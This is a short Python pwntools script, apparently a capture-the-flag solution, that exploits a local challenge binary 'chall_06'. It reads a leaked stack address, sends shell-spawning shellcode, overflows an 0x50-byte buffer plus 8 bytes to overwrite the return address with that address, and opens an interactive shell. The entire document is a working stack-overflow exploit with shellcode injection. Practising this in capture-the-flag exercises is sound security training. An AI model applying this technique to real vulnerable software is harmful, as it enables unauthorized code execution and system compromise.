import pwn

pwn.context.arch = 'amd64'
shellcode = pwn.asm(pwn.shellcraft.sh())
elf = pwn.context.binary = pwn.ELF("./chall_06")

filler = 0x50 # input buffer size
offset = 8 # distance to rbp

p = pwn.process(elf.path)

p.recvuntil(b"I drink milk even though i'm lactose intolerant: ")
leak = int(p.recvuntil(b"\n"), 16)

p.sendline(shellcode)

payload = b"A"*(filler + offset)
payload += pwn.p64(leak)

p.sendline(payload)

p.interactive()
